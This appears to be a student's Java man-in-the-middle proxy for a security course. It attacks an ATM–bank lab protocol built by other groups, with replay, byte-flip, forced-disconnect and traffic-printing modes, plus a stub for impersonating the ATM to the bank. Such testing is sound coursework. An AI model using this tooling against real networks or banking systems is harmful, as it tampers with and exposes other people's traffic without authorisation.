import java.io.*;
import java.net.ServerSocket;
import java.net.Socket;
import java.nio.charset.StandardCharsets;
import java.util.Arrays;
import java.util.Scanner;
import java.util.concurrent.*;

public class MITM {

	private final int listenPort;
	private final String remoteHost;
	private final int remotePort;
	private final ScheduledExecutorService scheduler = Executors.newScheduledThreadPool(1);

	public MITM(int listenPort, String remoteHost, int remotePort) {
		this.listenPort = listenPort;
		this.remoteHost = remoteHost;
		this.remotePort = remotePort;
	}

	public void start() throws IOException {
		ServerSocket serverSocket = new ServerSocket(listenPort);
		System.out.printf("Proxy listening on port %d, forwarding to %s:%d%n", listenPort, remoteHost, remotePort);
		Scanner sc = new Scanner(System.in);
		while (true) {
			System.out.println("Enter operation (r/t/f/p/d/n | 6/11) or 'quit' to exit:");
			String[] ops = sc.nextLine().split(" ");
			if (ops[0].equals("quit")) {
				break;
				// System.exit(0);
			}
			Socket clientSocket = serverSocket.accept();
			Socket serverSocketToRemote = new Socket(remoteHost, remotePort);
			System.out.printf("Accepted connection from %s, connected to remote.%n",
					clientSocket.getRemoteSocketAddress());
			switch (ops[0]) {
				case "r": // Replay attack
					switch (ops[1]) {
						case "6":
							System.out.printf("Initiating Replay Attack \n");
							new Thread(() -> replayAttackGrupo6(clientSocket, serverSocketToRemote)).start();
							new Thread(() -> forwardDataReplayAttackGroup6(serverSocketToRemote, clientSocket)).start();
							break;
						case "11":
							System.out.printf("Initiating Replay Attack \n");
							new Thread(() -> replayAttackGrupo11(clientSocket, serverSocketToRemote)).start();
							new Thread(() -> forwardData(serverSocketToRemote, clientSocket)).start();
							break;
						default:
							System.out.println("incorrect argument. insert another:");
							break;
					}
					break;
				case "t": // Timeout attack
					switch (ops[1]) {
						case "6":
							System.out.printf("Initiating Timeout Attack \n");
							// new Thread(() -> timeoutAttack(clientSocket, serverSocketToRemote)).start();
							// new Thread(() -> timeoutAttack(serverSocketToRemote, clientSocket)).start();
							break;
						case "11":
							System.out.printf("Initiating Timeout Attack \n");
							// new Thread(() -> timeoutAttack(clientSocket, serverSocketToRemote)).start();
							// new Thread(() -> timeoutAttack(serverSocketToRemote, clientSocket)).start();
							break;
						default:
							System.out.println("incorrect argument. insert another:");
							break;
					}
					break;
				case "f": // Byte Flip attack
					switch (ops[1]) {
						case "6":
							System.out.printf("Initiating Byte Flip Attack \n");
							new Thread(() -> byteFlip(clientSocket, serverSocketToRemote)).start();
							// new Thread(() -> byteFlip(serverSocketToRemote, clientSocket)).start();
							new Thread(() -> forwardData(serverSocketToRemote, clientSocket)).start();
							break;
						case "11":
							System.out.printf("Initiating Byte Flip Attack \n");
							new Thread(() -> byteFlip(clientSocket, serverSocketToRemote)).start();
							// new Thread(() -> byteFlip(serverSocketToRemote, clientSocket)).start();
							new Thread(() -> forwardData(serverSocketToRemote, clientSocket)).start();
							break;
						default:
							System.out.println("incorrect argument. insert another:");
							break;
					}
					break;
				case "p": // print packet size
					switch (ops[1]) {
						case "6":
							System.out.printf("Initiating Print Size of Packets \n");
							new Thread(() -> forwardDataSizeFromClient(clientSocket, serverSocketToRemote)).start();
							new Thread(() -> forwardDataSizeFromServer(serverSocketToRemote, clientSocket)).start();
							break;
						case "11":
							System.out.printf("Initiating Print Size of Packets \n");
							new Thread(() -> forwardDataSize(clientSocket, serverSocketToRemote)).start();
							new Thread(() -> forwardDataSize(serverSocketToRemote, clientSocket)).start();
							break;
						default:
							System.out.println("incorrect argument. insert another:");
							break;
					}
					break;
				case "d": // Connect and Disconnect attack
					switch (ops[1]) {
						case "6":
							System.out.printf("Initiating Connect & Disconnect Attack\n");
							new Thread(() -> forwardData(serverSocketToRemote, clientSocket)).start();
							connectAndDisconnect(clientSocket, 500);
							new Thread(() -> forwardData(serverSocketToRemote, clientSocket)).start();
							break;
						case "11":
							System.out.printf("Initiating Connect & Disconnect Attack\n");
							new Thread(() -> forwardData(serverSocketToRemote, clientSocket)).start();
							connectAndDisconnect(clientSocket, 500);
							new Thread(() -> forwardData(serverSocketToRemote, clientSocket)).start();
							break;
						default:
							System.out.println("incorrect argument. insert another:");
							break;
					}
					break;
				case "n":
					switch (ops[1]) {
						case "6":
							new Thread(() -> forwardData(clientSocket, serverSocketToRemote)).start();
							new Thread(() -> forwardData(serverSocketToRemote, clientSocket)).start();
							break;
						case "11":
							new Thread(() -> forwardData(clientSocket, serverSocketToRemote)).start();
							new Thread(() -> forwardData(serverSocketToRemote, clientSocket)).start();
							break;
						default:
							System.out.println("incorrect argument. insert another:");
							break;
					}
					break;
				case "i": // weaker integrity attack
					switch (ops[1]) {
						case "6":
							// ligar ao servidor e fazer autenticacao normal e fazer um pedido de criacao de
							// conta
							new Thread(() -> connectAndAuthenticateWithBank(clientSocket, serverSocketToRemote)).start();
							new Thread(() -> connectAndAuthenticateWithATM(serverSocketToRemote, clientSocket)).start();
							break;
						case "11":
							new Thread(() -> connectAndAuthenticateWithBank(clientSocket, serverSocketToRemote)).start();
							new Thread(() -> connectAndAuthenticateWithATM(serverSocketToRemote, clientSocket)).start();
							break;
						default:
							System.out.println("incorrect argument. insert another:");
							break;
					}
					break;
				default: // incorrect argument
					System.out.println("incorrect argument. insert another:");
					break;
			}
		}
		sc.close();
		serverSocket.close();
	}

	private void connectAndAuthenticateWithATM(Socket serverSocketToRemote, Socket clientSocket) {
		throw new UnsupportedOperationException("Unimplemented method 'connectAndAuthenticateWithATM'");
	}

	private void connectAndAuthenticateWithBank(Socket clientSocket, Socket serverSocketToRemote) {
		//ligar-me ao banco e fazer autenticacao normal
		/* try {
			byte[] bankPublicKey = load("..\\atm-bank-communication\\build\\libs\\bank.auth");
			byte[] mitmAtmKey = generate(128);
			Socket socket = new Socket("localhost", remotePort);
			ObjectOutputStream bankOut = new ObjectOutputStream(socket.getOutputStream());
			ObjectInputStream bankIn = new ObjectInputStream(socket.getInputStream());
			//construir primeira mensagem (enviada pelo cliente)
			// "m" + KEY_VALUE_SEPARATOR + encryptedMessageHex + FIELD_SEPARATOR + "i" + KEY_VALUE_SEPARATOR + integrityHex
			FirstMessage fstMsg = new FirstMessage();
			fstMsg.addField("k", mitmAtmKey);
			fstMsg.addField("t", System.currentTimeMillis());

			byte[] messageBytes = toBytes(buildMessage(fstMsg.getFields()));
			byte[] cipherMessage = encryptWithPublicKey(getPublicKeyFromBytes(bankPublicKey), messageBytes);

			byte[] hmac = generate(mitmAtmKey, cipherMessage);
			String firstMessage = "m:" + bytesToHexFormat(messageBytes) + "|i:" + bytesToHexFormat(hmac);

			bankOut.writeObject(firstMessage);
		} catch (Exception e) {
			e.printStackTrace();
		} */
	}

	private void forwardData(Socket inputSocket, Socket outputSocket) {
		try (InputStream in = inputSocket.getInputStream();
				OutputStream out = outputSocket.getOutputStream()) {

			byte[] buffer = new byte[4096];
			int bytesRead;
			while ((bytesRead = in.read(buffer)) != -1) {
				out.write(buffer, 0, bytesRead);
				System.out.println(bytesRead);
				// if (count){//bytesRead < 100) {
				// count = false;
				// System.out.println(Arrays.toString(buffer));
				// }
				out.flush();
			}
		} catch (IOException e) {
			// Connection closed or error – terminate forwarding
		} finally {
			try {
				inputSocket.close();
			} catch (IOException ignored) {
			}
			try {
				outputSocket.close();
			} catch (IOException ignored) {
			}
		}
	}

	private void forwardDataReplayAttackGroup6(Socket inputSocket, Socket outputSocket) {
		try (InputStream in = inputSocket.getInputStream();
				OutputStream out = outputSocket.getOutputStream()) {

			byte[] buffer = new byte[4096];
			byte[] replayBuffer = new byte[4096];

			int bytesRead;
			int messageNumber = 1;
			while ((bytesRead = in.read(buffer)) != -1) {
				if (messageNumber == 2) {
					replayBuffer = Arrays.copyOf(buffer, buffer.length);
				} else if(messageNumber > 2){
					out.write(replayBuffer);
					out.flush();
					messageNumber++;
					continue;
				}

				out.write(buffer, 0, bytesRead);
				System.out.println(bytesRead);
				out.flush();
				messageNumber++;
			}
		} catch (IOException e) {
			// Connection closed or error – terminate forwarding
		} finally {
			try {
				inputSocket.close();
			} catch (IOException ignored) {
			}
			try {
				outputSocket.close();
			} catch (IOException ignored) {
			}
		}
	}

	private void forwardDataSizeFromServer(Socket inputSocket, Socket outputSocket) {
		try (InputStream in = inputSocket.getInputStream();
				OutputStream out = outputSocket.getOutputStream()) {

			byte[] buffer = new byte[4096];
			int bytesRead;
			while ((bytesRead = in.read(buffer)) != -1) {
				System.out.println("###FROM SERVER###");
				out.write(buffer, 0, bytesRead);
				System.out.println();
				String message = new String(buffer, 0, bytesRead, StandardCharsets.UTF_8);
				System.out.println(message);
				out.flush();

				if (buffer[0] == 109 && buffer[1] == 58) {
					// System.out.println(Arrays.toString(buffer));
					System.out.println(bytesRead);
				}
			}

		} catch (IOException e) {
		} finally {
			try {
				inputSocket.close();
			} catch (IOException ignored) {
			}
			try {
				outputSocket.close();
			} catch (IOException ignored) {
			}
		}
	}

	private void forwardDataSizeFromClient(Socket inputSocket, Socket outputSocket) {
		try (InputStream in = inputSocket.getInputStream();
				OutputStream out = outputSocket.getOutputStream()) {

			byte[] buffer = new byte[4096];
			int bytesRead;
			while ((bytesRead = in.read(buffer)) != -1) {
				System.out.println("###FROM CLIENT###");
				out.write(buffer, 0, bytesRead);
				System.out.println();
				String message = new String(buffer, 0, bytesRead, StandardCharsets.UTF_8);
				System.out.println(message);
				out.flush();

				if (buffer[0] == 109 && buffer[1] == 58) {
					// System.out.println(Arrays.toString(buffer));
					System.out.println(bytesRead);
				}
			}

		} catch (IOException e) {
		} finally {
			try {
				inputSocket.close();
			} catch (IOException ignored) {
			}
			try {
				outputSocket.close();
			} catch (IOException ignored) {
			}
		}
	}

	private void forwardDataSize(Socket inputSocket, Socket outputSocket) {
		try (InputStream in = inputSocket.getInputStream();
				OutputStream out = outputSocket.getOutputStream()) {

			byte[] buffer = new byte[4096];
			int bytesRead;
			while ((bytesRead = in.read(buffer)) != -1) {
				out.write(buffer, 0, bytesRead);
				System.out.println();
				String message = new String(buffer, 0, bytesRead, StandardCharsets.UTF_8);
				System.out.println(message);
				out.flush();

				if (buffer[0] == 109 && buffer[1] == 58) {
					// System.out.println(Arrays.toString(buffer));
					System.out.println(bytesRead);
				}
			}

		} catch (IOException e) {
		} finally {
			try {
				inputSocket.close();
			} catch (IOException ignored) {
			}
			try {
				outputSocket.close();
			} catch (IOException ignored) {
			}
		}
	}

	public static void connectAndDisconnect(Socket inputSocket, int delayMillis) {
		try {
			Thread.sleep(delayMillis);
			System.out.println("Disconnecting abruptly...");
			inputSocket.setSoLinger(true, 0); // Forces a TCP RST on close
			inputSocket.close();
		} catch (IOException | InterruptedException e) {
			e.printStackTrace();
		} finally {
			if (inputSocket != null && !inputSocket.isClosed()) {
				try {
					inputSocket.close();
				} catch (IOException ignored) {
				}
			}
		}
	}

	private void byteFlip(Socket inputSocket, Socket outputSocket) {
		try (InputStream in = inputSocket.getInputStream();
				OutputStream out = outputSocket.getOutputStream()) {

			byte[] buffer = new byte[4096];
			int bytesRead;
			int count = 0;
			byte[] delayedPacket;
			while ((bytesRead = in.read(buffer)) != -1) {
				if (count != 0) {
					out.write(buffer, 0, bytesRead);
					// System.out.println(Arrays.toString(buffer));
					out.flush();
				} else {
					delayedPacket = new byte[bytesRead];
					System.arraycopy(buffer, 0, delayedPacket, 0, bytesRead);

					System.out.println("\n Bytes Read: " + bytesRead);
					System.out.println("\n Original Array: ");
					System.out.println(Arrays.toString(buffer).substring(0, 100));

					delayedPacket[0] = (byte) 2;
					delayedPacket[1] = (byte) 5;
					System.out.println("\n Flipped indexes 0 and 1 of the Array to " + delayedPacket[0] + " and " + delayedPacket[1] + "!\n");

					// System.out.println(delayedPacket.length);
					System.out.println(Arrays.toString(delayedPacket));
					System.out.println("\n Sending altered array...");
					out.write(delayedPacket, 0, bytesRead);
					out.flush();
				}
				count++;
			}
		} catch (IOException e) {
			// Connection closed or error – terminate forwarding
		} finally {
			try {
				inputSocket.close();
			} catch (IOException ignored) {
			}
			try {
				outputSocket.close();
			} catch (IOException ignored) {
			}
		}
	}

	private void replayAttackGrupo6(Socket inputSocket, Socket outputSocket) {
		try (InputStream in = inputSocket.getInputStream();
				OutputStream out = outputSocket.getOutputStream()) {

			byte[] buffer = new byte[4096];
			int bytesRead;
			int messageCount = 0;

			while ((bytesRead = in.read(buffer)) != -1) {
				messageCount++;
				// Immediately forward original message
				out.write(buffer, 0, bytesRead);
				out.flush();

				// Make a copy of the message to replay later
				byte[] messageCopy = new byte[bytesRead];
				System.arraycopy(buffer, 0, messageCopy, 0, bytesRead);

				// If it's one of the first 2 client messages, schedule replay
				/* if (messageCount == 2 || messageCount == 3) {
					int finalMessageCount = messageCount;
					scheduler.schedule(() -> {
						try {
							out.write(messageCopy);
							out.flush();
							System.out.println(
									"Replayed client message #" + finalMessageCount + " of size " + messageCopy.length);
						} catch (IOException e) {
							try {
								outputSocket.close();
							} catch (IOException e1) {
								// e1.printStackTrace();
							}
							// e.printStackTrace();
						}
					}, 20, TimeUnit.MILLISECONDS);
				} */
			}

		} catch (IOException | RejectedExecutionException e) {
			// Connection closed or error – terminate forwarding
		} finally {
			try {
				inputSocket.close();
			} catch (IOException ignored) {
			}
			try {
				outputSocket.close();
			} catch (IOException ignored) {
			}
			scheduler.shutdown();
		}
	}

	private void replayAttackGrupo11(Socket inputSocket, Socket outputSocket) {
		try (InputStream in = inputSocket.getInputStream();
				OutputStream out = outputSocket.getOutputStream()) {

			byte[] buffer = new byte[4096];
			int bytesRead;
			int messageCount = 0;

			while ((bytesRead = in.read(buffer)) != -1) {
				messageCount++;
				// Immediately forward original message
				out.write(buffer, 0, bytesRead);
				out.flush();

				// Make a copy of the message to replay later
				byte[] messageCopy = new byte[bytesRead];
				System.arraycopy(buffer, 0, messageCopy, 0, bytesRead);

				// If it's one of the first 2 client messages, schedule replay
				if (messageCount == 1 || messageCount == 2) {
					int finalMessageCount = messageCount;
					scheduler.schedule(() -> {
						try {
							out.write(messageCopy);
							out.flush();
							System.out.println(
									"Replayed client message #" + finalMessageCount + " of size " + messageCopy.length);
						} catch (IOException e) {
							try {
								outputSocket.close();
							} catch (IOException e1) {
								// e1.printStackTrace();
							}
							// e.printStackTrace();
						}
					}, 20, TimeUnit.MILLISECONDS);
				}
			}

		} catch (IOException | RejectedExecutionException e) {
			// Connection closed or error – terminate forwarding
		} finally {
			try {
				inputSocket.close();
			} catch (IOException ignored) {
			}
			try {
				outputSocket.close();
			} catch (IOException ignored) {
			}
			scheduler.shutdown();
		}
	}

	public static void main(String[] args) {
		if (args.length != 3) {
			System.err.println("Usage: java SimpleMITMProxy <listenPort> <remoteHost> <remotePort>");
			System.exit(1);
		}
		int listenPort = Integer.parseInt(args[0]);
		String remoteHost = args[1];
		int remotePort = Integer.parseInt(args[2]);

		try {
			new MITM(listenPort, remoteHost, remotePort).start();
		} catch (IOException e) {
			e.printStackTrace();
		}
		System.exit(0);
	}
}

